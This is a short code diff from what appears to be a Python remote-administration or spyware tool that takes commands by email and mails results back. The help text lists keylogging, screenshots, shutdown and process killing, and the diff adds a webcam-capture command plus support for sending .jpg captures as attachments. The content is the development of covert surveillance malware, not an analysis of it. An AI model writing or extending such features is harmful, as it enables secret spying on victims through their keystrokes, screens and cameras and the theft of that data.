@@ -28,6 +28,7 @@ def send_mail_success_execution(recipient_mail, command, filename=None):
         help
         shutdown
         screenshot
+        webcam (takes image from webcam)
         keylog
         list_processes
         kill_process <pid>'''
@@ -41,7 +42,7 @@ def send_mail_success_execution(recipient_mail, command, filename=None):
     # if has attachment
     if filename != None:
         # image or plain text (binary or text)
-        if filename.lower().endswith('.png'):
+        if filename.lower().endswith('.png') or filename.lower().endswith('.jpg'):
             attachment = open(filename, 'rb')
             file = MIMEImage(attachment.read(), name=filename)
         else:
